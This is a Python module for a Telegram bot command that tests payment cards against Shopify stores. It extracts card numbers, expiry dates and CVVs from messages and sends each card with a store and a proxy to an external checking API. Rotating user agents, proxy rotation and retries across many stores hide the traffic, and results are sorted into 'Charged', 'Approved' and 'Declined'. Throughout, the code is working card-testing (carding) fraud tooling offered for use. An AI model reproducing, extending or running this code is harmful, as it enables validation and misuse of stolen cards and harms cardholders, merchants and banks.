
import re
import asyncio
import aiohttp
import random
import json
import time
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse

from bin import get_bin_info
from database.db import (
    get_user_proxies, is_premium, get_all_working_sites,
    is_gate_enabled, delete_user_proxy, delete_site,
    log_check
)
from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from config import OWNER_USERNAME, OWNER_NAME, OWNER_ID
from telegram import Update, LinkPreviewOptions

logger = get_logger(__name__)





API_ENDPOINT = "https://check.yzio.app/shopify"  # default; overridden dynamically

def _get_api_endpoint() -> str:
    """Get active API endpoint from DB (primary or owner-added)."""
    try:
        from database.db import get_all_api_urls_db
        urls = get_all_api_urls_db()
        base = urls[0] if urls else "https://check.yzio.app"
        return f"{base.rstrip('/')}/shopify"
    except Exception:
        return API_ENDPOINT
REQUEST_TIMEOUT = 50
MAX_RETRIES = 2
MAX_ZERO_PRICE_RETRIES = 3
MAX_SITES_TO_TRY = 15
BASE_DELAY = 0.005

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

CHARGED_RESPONSES = [
    "ORDER_PLACED",
    "ORDER_PAID",
    "Order Confirm"
]

APPROVED_RESPONSES = [
    "INSUFFICIENT_FUNDS",
    "OTP",
    "3DS",
    "AUTHENTICATION",
    "OTP_REQUIRED"
]

DECLINED_RESPONSES = {
    "VALIDATION_CUSTOM",
    "GENERIC_ERROR",
    "DECISION_RULE_BLOCK",
    "CARD_DECLINED",
    "DECLINED",
    "PAYMENT_FAILED",
    "DO_NOT_HONOR",
    "INVALID_CARD",
    "EXPIRED_CARD",
    "PICK_UP_CARD",
    "STOLEN_CARD",
    "LOST_CARD",
    "FRAUDULENT",
    "FRAUD_SUSPECTED",
}

OWNER_DISPLAY_NAME = "𝑶𝑮𝑮𝒀 𝑷𝑹𝑶𝑶"





def mask_proxy(proxy: str) -> str:
    if not proxy:
        return "N/A"
    try:
        if '://' in proxy:
            proxy = proxy.split('://', 1)[1]
        if '@' in proxy:
            proxy = proxy.split('@', 1)[1]
        if ':' in proxy:
            host = proxy.split(':', 1)[0]
        else:
            host = proxy
        if host.endswith('.pointtoserver.com'):
            host = host.replace('.pointtoserver.com', '')
        if len(host) > 30:
            host = host[:27] + '...'
        return host
    except Exception:
        return proxy[:30] if proxy else "N/A"

def mask_site(site: str) -> str:
    if not site or site == 'N/A':
        return 'N/A'
    try:
        parsed = urlparse(site)
        domain = parsed.netloc or site
        domain = domain.replace('www.', '').replace('.myshopify.com', '')
        if len(domain) > 20:
            domain = domain[:17] + '...'
        return domain
    except Exception:
        return site[:20] + '...' if len(site) > 20 else site

def format_elapsed_short(seconds: float) -> str:
    return f"{seconds:.2f}s"

def is_card_expired(month: str, year: str) -> bool:
    try:
        now = datetime.now()
        if len(year) == 2:
            year_full = 2000 + int(year)
        else:
            year_full = int(year[:2]) if len(year) >= 2 else int(year)
        month_int = int(month)
        if year_full < now.year:
            return True
        if year_full == now.year and month_int < now.month:
            return True
        return False
    except Exception:
        return False

def is_decline_response(response_text: str) -> bool:
    if not response_text:
        return False
    response_upper = response_text.upper()
    for indicator in DECLINED_RESPONSES:
        if indicator in response_upper:
            return True
    return False






CARD_PATTERN = re.compile(
    r'(\d{13,19})\s*[|/:]\s*(\d{1,2})\s*[|/:]\s*(\d{2,4})\s*[|/:]\s*(\d{3,4})'
)
CARD_PATTERN_SPACE = re.compile(
    r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
)

def extract_card_from_text(text: str) -> Optional[str]:
    """Extract the first valid card from text, including bot's output format."""
    if not text:
        return None


    for pattern in [CARD_PATTERN, CARD_PATTERN_SPACE]:
        match = pattern.search(text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"



    match = re.search(r'Card\s+[➭:]\s+(\d{13,19})\s*[|/:]\s*(\d{1,2})\s*[|/:]\s*(\d{2,4})\s*[|/:]\s*(\d{3,4})', text)
    if match:
        card_number, month, year, cvv = match.groups()
        month = month.zfill(2)
        if len(year) == 4:
            year = year[2:]
        return f"{card_number}|{month}|{year}|{cvv}"



    match = re.search(r'(\d{13,19})\s*[|/:]\s*(\d{1,2})\s*[|/:]\s*(\d{2,4})\s*[|/:]?\s*(\d{0,4})?', text)
    if match:
        card_number = match.group(1)
        month = match.group(2).zfill(2) if match.group(2) else "01"
        year = match.group(3)[:2] if match.group(3) else "26"
        cvv = match.group(4) if match.group(4) else "000"
        if len(year) == 4:
            year = year[2:]
        return f"{card_number}|{month}|{year}|{cvv}"

    return None

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)





async def _do_request(card_details: str, site: str, proxy: str) -> dict:
    params = {'cc': card_details, 'site': site, 'proxy': proxy}
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'application/json',
        'Connection': 'keep-alive'
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(_get_api_endpoint(), params=params, timeout=REQUEST_TIMEOUT, headers=headers) as resp:
            text = await resp.text()
            try:
                data = json.loads(text)
            except json.JSONDecodeError:
                raise Exception(f"Invalid JSON response: {text[:100]}")
            return data

def process_shopii_response(data: dict, card_details: str, site: str, proxy: str,
                            start_time: float, brand: str, level: str, card_type: str,
                            issuer: str, country: str, country_flag: str, currency: str,
                            user_id: int) -> dict:
    api_status = data.get("Status", False)
    response_text = data.get("Response", "")
    price = data.get("Price", "0")
    gateway = data.get("Gateway", "Shopify")
    currency = data.get("Currency") or currency
    proxy_status = data.get("Proxy", "live")
    elapsed = time.time() - start_time

    if proxy_status == "dead":
        logger.warning(f"API marked proxy {proxy} as dead for user {user_id}")
        delete_user_proxy(proxy, user_id)

    if "DEAD_STORE" in response_text:
        logger.warning(f"Site {site} is dead (DEAD_STORE), deleting")
        delete_site(site)

    status_info = None
    error_msg = None

    if any(phrase in response_text for phrase in CHARGED_RESPONSES):
        status_info = {"status": "Charged", "emoji": E.get_charge_emoji()}
    elif any(phrase in response_text for phrase in APPROVED_RESPONSES):
        status_info = {"status": "Approved", "emoji": E.APPROVED}
    elif is_decline_response(response_text):
        status_info = {"status": "Declined", "emoji": E.DECLINED}
    else:
        status_info = {"status": "Error", "emoji": E.ERROR}
        error_msg = response_text or "Unknown error"

    log_check(user_id=user_id, card=card_details, status=status_info['status'],
              message=response_text, gateway=gateway, time_taken=elapsed)

    result = {
        "success": api_status,
        "card": card_details,
        "response": response_text,
        "gateway": gateway,
        "price": price,
        "brand": brand,
        "level": level,
        "type": card_type,
        "issuer": issuer,
        "country": country,
        "country_flag": country_flag,
        "currency": currency,
        "site": site,
        "proxy": proxy,
        "status_info": status_info,
        "elapsed": elapsed,
    }
    if error_msg is not None:
        result["error"] = error_msg

    return result





async def check_single_card(
    card_details: str,
    user_id: int,
    proxies: List[str],
    sites_data: List[dict],
    retry_on_error: bool = True,
) -> dict:
    parsed = parse_card_details(card_details)
    if not parsed:
        return {
            "success": False,
            "error": "Invalid card format",
            "card": card_details,
            "currency": "USD",
            "country": "Unknown",
            "country_flag": "",
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }
    card_number, month, year, cvv = parsed

    if is_card_expired(month, year):
        return {
            "success": False,
            "error": "Card Expired",
            "card": card_details,
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Expired", "emoji": E.ERROR},
            "currency": "USD",
            "country": "Unknown",
            "country_flag": "",
        }

    bin_info = await get_bin_info(card_number[:6])
    brand = (bin_info.get("scheme") or "N/A").title()
    level = bin_info.get("level") or "N/A"
    card_type = bin_info.get("type") or "N/A"
    issuer = bin_info.get("bank") or "N/A"
    currency = bin_info.get("currency") or "USD"
    country = bin_info.get("country") or "Unknown"
    country_flag = bin_info.get("country_emoji", "")
    formatted = f"{card_number}|{month}|{year}|{cvv}"

    if not sites_data:
        error_msg = "No working sites found"
        logger.error(f"❌ {error_msg} for card {card_details}")
        return {
            "success": False,
            "error": error_msg,
            "card": card_details,
            "currency": currency,
            "country": country,
            "country_flag": country_flag,
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }
    if not proxies:
        error_msg = "No proxies available"
        logger.error(f"❌ {error_msg} for card {card_details}")
        return {
            "success": False,
            "error": error_msg,
            "card": card_details,
            "currency": currency,
            "country": country,
            "country_flag": country_flag,
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }

    start_time = time.time()
    available_sites = [s["url"] for s in sites_data]
    random.shuffle(available_sites)
    available_sites = available_sites[:MAX_SITES_TO_TRY]
    available_proxies = proxies.copy()
    random.shuffle(available_proxies)

    if not retry_on_error:
        site = random.choice(available_sites)
        proxy = random.choice(available_proxies)
        try:
            data = await _do_request(formatted, site, proxy)
            return process_shopii_response(
                data, formatted, site, proxy, start_time,
                brand, level, card_type, issuer, country, country_flag, currency, user_id
            )
        except Exception as e:
            elapsed = time.time() - start_time
            error_msg = str(e) or "Unknown network error"
            logger.error(f"Single attempt failed for {card_details} | site={site} | proxy={proxy} | error={error_msg}")
            return {
                "success": False,
                "error": error_msg,
                "card": card_details,
                "elapsed": elapsed,
                "type": "error",
                "status_info": {"status": "Error", "emoji": E.ERROR},
                "site": site,
                "proxy": proxy,
                "response": None,
                "currency": currency,
                "country": country,
                "country_flag": country_flag,
            }

    retry_count = 0
    last_error = None
    last_site = None
    last_proxy = None
    last_response = None
    zero_price_retries = 0
    max_zero_price_retries = MAX_ZERO_PRICE_RETRIES

    for attempt in range(MAX_RETRIES * 3 + max_zero_price_retries):
        if retry_count >= MAX_RETRIES and zero_price_retries >= max_zero_price_retries:
            break
        if attempt < len(available_sites):
            site = available_sites[attempt % len(available_sites)]
        else:
            site = random.choice(available_sites)
        last_site = site
        if attempt < len(available_proxies):
            proxy = available_proxies[attempt % len(available_proxies)]
        else:
            proxy = random.choice(proxies)
        last_proxy = proxy

        logger.debug(f"Attempt {attempt+1}: Checking {card_details} on {site} via {proxy}")
        try:
            data = await _do_request(formatted, site, proxy)
            result = process_shopii_response(
                data, formatted, site, proxy, start_time,
                brand, level, card_type, issuer, country, country_flag, currency, user_id
            )
            last_response = result.get("response", "")

            if result["status_info"]["status"] in ("Charged", "Approved", "Declined"):
                return result

            if result["status_info"]["status"] == "Error":
                if "DEAD_STORE" in result.get("response", ""):
                    available_sites = [s for s in available_sites if s != site]
                    retry_count += 1
                    continue
                if data.get("Proxy") == "dead":
                    available_proxies = [p for p in available_proxies if p != proxy]
                    retry_count += 1
                    continue
                return result

            try:
                price_float = float(result.get("price", "0"))
            except:
                price_float = 0.0
            if price_float == 0.0 and zero_price_retries < max_zero_price_retries:
                zero_price_retries += 1
                logger.debug(f"Zero price for {card_details}, retry {zero_price_retries}/{max_zero_price_retries} (site={site}, proxy={proxy})")
                if len(available_sites) > 1:
                    available_sites = [s for s in available_sites if s != site]
                retry_count += 1
                continue

            return result

        except asyncio.TimeoutError:
            last_error = "Timeout"
            logger.error(f"Timeout on {site}, proxy {proxy} for {card_details}")
            retry_count += 1
            continue
        except Exception as e:
            last_error = str(e) or "Unknown error"
            logger.error(f"Exception on {site}, proxy {proxy} for {card_details}: {e}")
            retry_count += 1
            continue

    elapsed = time.time() - start_time
    log_check(user_id=user_id, card=card_details, status="Error",
              message=last_error or "All attempts failed", gateway="Shopify", time_taken=elapsed)
    logger.error(f"❌ All attempts failed for {card_details}, last_site={last_site}, last_proxy={last_proxy}, error={last_error}")
    return {
        "success": False,
        "error": last_error or "All attempts failed",
        "card": card_details,
        "elapsed": elapsed,
        "type": "error",
        "status_info": {"status": "Error", "emoji": E.ERROR},
        "site": last_site,
        "proxy": last_proxy,
        "response": last_response,
        "currency": currency,
        "country": country,
        "country_flag": country_flag,
    }





def format_result_text(result: dict, user_id: int, first_name: str) -> str:
    elapsed = result.get('elapsed', 0)
    elapsed_str = format_elapsed_short(elapsed)
    if not result.get("success") and result.get("status_info", {}).get("status") not in ("Declined", "Expired"):
        return f"""
{E.ERROR} <b>Error Detected</b> {E.ERROR}
{E.CARD} <b>Card:</b> <code>{result.get('card', 'Unknown')}</code>
{E.RESPONSE} <b>Reason:</b> <i>{result.get('error', 'Unknown error')}</i>
{E.ELAPS} <b>Time:</b> {elapsed_str}
━━━━━━━━━━━━━━━━━━
{E.USER} ➭ <a href='tg://user?id={user_id}'>{first_name}</a> | {E.OWNER} ➭ <a href='tg://user?id={OWNER_ID}'>{OWNER_DISPLAY_NAME}</a>"""

    status_info = result.get("status_info", {"status": "Unknown", "emoji": E.ERROR})
    price = result.get('price', '0')
    brand = result.get('brand', 'N/A')
    level = result.get('level', '')
    card_type = result.get('type', '')
    issuer = result.get('issuer', 'N/A')
    country = result.get('country', 'Unknown')
    country_flag = result.get('country_flag', '')
    currency = result.get('currency', 'USD')
    masked_proxy = mask_proxy(result.get('proxy', ''))

    brand_display = brand
    if level:
        brand_display += f" {level}"
    if card_type:
        brand_display += f" {card_type}"
    try:
        price_float = float(re.sub(r'[^\d.]', '', price))
        price_display = f"${price_float:.2f}"
    except:
        price_display = f"${price}"

    return f"""
<b>STATUS ➜ {status_info['status']} {status_info['emoji']}</b>
━━━━━━━━━━━━━━━━━━
{E.CARD} <b>Card  ➭ </b><code>{result['card']}</code>
{E.RESPONSE} <b>Response  ➭ </b><code>{result.get('response', '')} </code>
{E.GATE} <b>Gateway  ➭ </b>{result.get('gateway', 'Shopify')} • {price_display} {currency}
━━━━━━━━━━━━━━━━━━
<blockquote><b>Bank:</b> {issuer}
<b>Brand:</b> {brand_display}
<b>Country:</b> {country_flag} {country}
{E.ELAPS} ➭ {elapsed_str} | {E.PX} ➭ {masked_proxy}</blockquote>
━━━━━━━━━━━━━━━━━━
{E.USER} ➭ <a href='tg://user?id={user_id}'>{first_name}</a> | {E.OWNER} ➭ <a href='tg://user?id={OWNER_ID}'>{OWNER_DISPLAY_NAME}</a>
"""





@check_lock
@rate_limit("gate")
async def handle_sh_command(update: Update, context):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username

    if not is_gate_enabled('shopify'):
        await update.message.reply_text(
            f"""
{E.CLOSE} <b>Gate Temporarily Unavailable</b>

The <b>Shopify</b> gate is currently disabled.
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return


    card_details = None
    reply_msg = update.message.reply_to_message


    if context.args:
        card_details = " ".join(context.args).strip()
        logger.info(f"Card from args: {card_details}")


    if not card_details and reply_msg:
        reply_text = reply_msg.text or reply_msg.caption or ""
        card_details = extract_card_from_text(reply_text)
        if card_details:
            logger.info(f"Card extracted from reply: {card_details}")


    if not card_details and update.message.text:
        text = update.message.text

        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            candidate = parts[1].strip()

            if re.search(r'\d{13,19}', candidate):
                card_details = candidate
                logger.info(f"Card from command text: {card_details}")


    if not card_details and update.message.text:
        card_details = extract_card_from_text(update.message.text)
        if card_details:
            logger.info(f"Card extracted from full message: {card_details}")


    if not card_details:
        await update.message.reply_text(
            f"""
{E.WARNING} <b>No Card Found</b>

{E.NOTE} <b>Usage:</b>
<code>/sh 4242424242424242|12|26|123</code>

<b>Or reply to any message containing a card.</b>
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return


    parsed = parse_card_details(card_details)
    if not parsed:

        raw = card_details
        extracted = extract_card_from_text(raw)
        if extracted:
            parsed = parse_card_details(extracted)
            if parsed:
                card_details = extracted
                logger.info(f"Re-extracted card: {card_details}")

    if not parsed:
        await update.message.reply_text(
            f"""
{E.ERROR} <b>Invalid Card Format</b>

{E.NOTE} Please use one of these formats:
<code>card|mm|yy|cvv</code>
<code>card/mm/yy/cvv</code>
<code>card:mm:yy:cvv</code>
<code>card mm yy cvv</code>

<b>Your input:</b> <code>{card_details[:50]}</code>
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return


    proxies_data = get_user_proxies(user_id)
    proxies = [p["proxy"] for p in proxies_data if p.get("status") == "active"]
    if not proxies:
        await update.message.reply_text(
            f"""
{E.WARNING} NO PROXIES FOUND
━━━━━━━━━━━━━━━━━━
{E.NOTE} Add proxies using /proxy
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    sites_data = get_all_working_sites()
    if not sites_data:
        await update.message.reply_text(
            f"""
{E.WARNING} NO SITES FOUND
━━━━━━━━━━━━━━━━━━
{E.NOTE} Add sites using /addsite
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return


    progress = await update.message.reply_text(
        f"""
{E.FLY} <b>Processing...</b>
<pre>{card_details}</pre>
Gateway ➠ <i>Shopify</i>
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    async def background():
        result = await check_single_card(
            card_details=card_details,
            user_id=user_id,
            proxies=proxies,
            sites_data=sites_data,
            retry_on_error=True,
        )
        formatted = format_result_text(result, user_id, first_name)
        try:
            await progress.edit_text(
                formatted,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        except Exception as e:
            logger.error(f"Failed to edit progress: {e}")
            await update.message.reply_text(
                formatted,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )

    asyncio.create_task(background())